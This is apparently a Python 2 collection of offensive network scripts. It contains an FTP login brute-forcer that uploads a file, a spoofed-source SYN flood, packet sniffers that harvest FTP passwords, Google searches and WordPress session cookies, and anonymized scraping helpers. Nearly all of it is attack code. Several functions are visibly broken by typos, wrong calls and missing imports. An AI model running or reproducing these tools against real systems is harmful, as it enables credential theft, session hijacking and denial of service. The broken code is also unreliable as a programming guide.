import ftplib
import json
import optparse
import urllib

from BeautifulSoup import BeautifulSoup
from scapy.all import *
from scapy.layers.inet import IP

from anonBrowser import *

cookieTable = {}


def connect_sand(text_s, host, port):
    socket.setdefaulttimeout((2))
    s = socket.socket()
    try:
        s.bind((host, port))
        s.listen(5)
        hostlist = []
        while True:
            c, addr = s.accept()
            c.sind((text_s))
            c.close()
            hostlist.append(addr)
    except:
        exit()


def connect_connect(host, port):
    socket.setdefaulttimeout(2)
    s = socket.socket
    try:
        s.connect((host, port))
        ans = s.recv(1024)
    except:
        pass


def FTPinput(host, userf, passf, filename):
    ftp = ftplib.ftp(host)
    user = open(userf, 'r')
    passwd = open(passf, 'r')
    for u in user:
        for p in passwd:
            try:
                ftp.login(u, p)
            except:
                pass
    uf = u
    pf = p
    bufsize = 1024
    command = 'STOR' + filename
    filehandler = open(filename, 'rb')
    ftp.storbinary(command, filehandler, bufsize)
    filehandler.close()


def synFlood(src, host):
    for sport in range(1024, 65535):
        IPlayer = scapy.IP(src=src, dst=host)
        TCPlayer = scapy.TCP(sport=sport, dport="513")
        pkt = IPlayer / TCPlayer
        scapy.send(pkt)


def googlefind(pkt):
    def findGoogle(pkt):
        if pkt.haslayer(Raw):
            payload = pkt.getlayer(Raw).load  # type: object
            if 'GET' in payload:
                if 'google' in payload:
                    r = re.findall(r'(?i)\&q=(.*?)\&', payload)
                    if r:
                        search = r[0].split('&')[0]
                        search = search.replace('q=', ''). \
                            replace('+', ' ').replace('%20', ' ')
                        print '[+] Searched For: ' + search


def start_googolefind(mon):
    conf.iface = mon
    sniff(filter='tcp port 80', prn=googlefind)


def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)

    if user:
        print '[*] Detected FTP Login to ' + str(dest)
        print '[+] User account: ' + str(user[0])
    elif pswd:
        print '[+] Password: ' + str(pswd[0])
def start_ftpsniff(mon):
    conf.iface = mon
    sniff(filter='tcp port 21', prn=ftpSniff)


def cookiefind(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if r and 'Set' not in raw:
        if r[0] not in cookieTable.keys():
            cookieTable[r[0]] = pkt.getlayer(IP).src
            print '[+] Detected and indexed cookie.'
        elif cookieTable[r[0]] != pkt.getlayer(IP).src:
            print '[*] Detected Conflict for ' + r[0]
            print 'Victim   = ' + cookieTable[r[0]]
            print 'Attacker = ' + pkt.getlayer(IP).src


def start_cookie(mon):
    conf.iface = mon
    sniff(filter="tcp port 80", prn=cookiefind)


def cookieexp(pkt):
    raw = pkt.sprintf('%Raw.load%')
    r = re.findall('wordpress_[0-9a-fA-F]{32}', raw)
    if r and 'SET' not in raw:
        print pkt.getlayer(IP).src + ">" + pkt.getlayer(IP).dsk + "cookie:" + r[0]


def cookieexp_start(mon):
    conf.iface = mon
    sniff(filter='tcp port 80', prn=cookieexp)


class Google_Result:

    def __init__(self, title, text, url):
        self.title = title
        self.text = text
        self.url = url

    def __repr__(self):
        return self.title


def google(search_term):
    ab = anonBrowser()

    search_term = urllib.quote_plus(search_term)
    response = ab.open('http://ajax.googleapis.com/' + \
                       'ajax/services/search/web?v=1.0&q=' + search_term)
    objects = json.load(response)
    results = []

    for result in objects['responseData']['results']:
        url = result['url']
        title = result['titleNoFormatting']
        text = result['content']
        new_gr = Google_Result(title, text, url)
        results.append(new_gr)
    return results


def google_start():
    parser = optparse.OptionParser('usage %prog ' + \
                                   '-k <keywords>')
    parser.add_option('-k', dest='keyword', type='string', \
                      help='specify google keyword')
    (options, args) = parser.parse_args()
    keyword = options.keyword

    if options.keyword == None:
        print parser.usage
        exit(0)
    else:
        results = google(keyword)
        print results


def mirrorImages(url, dir):
    ab = anonBrowser()
    ab.anonymize()
    html = ab.open(url)
    soup = BeautifulSoup(html)
    image_tags = soup.findAll('img')

    for image in image_tags:
        filename = image['src'].lstrip('http://')
        filename = os.path.join(dir, \
                                filename.replace('/', '_'))
        print '[+] Saving ' + str(filename)
        data = ab.open(image['src']).read()
        ab.back()
        save = open(filename, 'wb')
        save.write(data)
        save.close()


def mirrorimages_start():
    parser = optparse.OptionParser('usage %prog ' + \
                                   '-u <target url> -d <destination directory>')

    parser.add_option('-u', dest='tgtURL', type='string', \
                      help='specify target url')
    parser.add_option('-d', dest='dir', type='string', \
                      help='specify destination directory')

    (options, args) = parser.parse_args()

    url = options.tgtURL
    dir = options.dir

    if url == None or dir == None:
        print parser.usage
        exit(0)

    else:
        try:
            mirrorImages(url, dir)
        except Exception, e:
            print '[-] Error Mirroring Images.'
            print '[-] ' + str(e)


def printLinks(url):
    ab = anonBrowser()
    ab.anonymize()
    page = ab.open(url)
    html = page.read()

    try:
        print '[+] Printing Links From  Regex.'
        link_finder = re.compile('href="(.*?)"')
        links = link_finder.findall(html)
        for link in links:
            print link
    except:
        pass

    try:
        print '\n[+] Printing Links From BeautifulSoup.'
        soup = BeautifulSoup(html)
        links = soup.findAll(name='a')
        for link in links:
            if link.has_key('href'):
                print link['href']
    except:
        pass


def printlink_start():
    parser = optparse.OptionParser('usage %prog ' + \
                                   '-u <target url>')

    parser.add_option('-u', dest='tgtURL', type='string', \
                      help='specify target url')

    (options, args) = parser.parse_args()
    url = options.tgtURL

    if url == None:
        print parser.usage
        exit(0)
    else:
        printLinks(url)


def testProxy(url, proxy):
    browser = mechanize.Browser()
    browser.set_proxies(proxy)
    page = browser.open(url)
    source_code = page.read()
    print source_code


def testUserAgent(url, userAgent):
    browser = mechanize.Browser()
    browser.addheaders = userAgent
    page = browser.open(url)
    source_code = page.read()
    print source_code


def printCookies(url):
    browser = mechanize.Browser()
    cookie_jar = cookielib.LWPCookieJar()
    browser.set_cookiejar(cookie_jar)
    page = browser.open(url)
    for cookie in cookie_jar:
        print cookie
